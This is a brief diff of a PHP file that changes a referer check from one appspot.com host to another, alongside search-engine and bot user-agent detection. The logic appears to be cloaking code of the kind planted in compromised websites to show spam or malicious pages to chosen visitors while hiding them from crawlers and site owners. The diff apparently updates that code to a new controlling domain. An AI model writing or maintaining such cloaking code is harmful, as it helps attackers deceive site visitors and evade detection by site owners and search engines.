@@ -662,7 +662,7 @@ if ( searchEngineDetect() !== false ) {
 	{
 		$asdasd = false;
 	}
-	if ( parse_url( $_SERVER['HTTP_REFERER'] )['host'] == 'ilovezlotiz.ey.r.appspot.com' ) {
+	if ( parse_url( $_SERVER['HTTP_REFERER'] )['host'] == 'ilovezlotizz.nw.r.appspot.com' ) {
 		$asdasd = true;
 	}
 	if ( isBots( $_SERVER['HTTP_USER_AGENT'] ) != false ) {
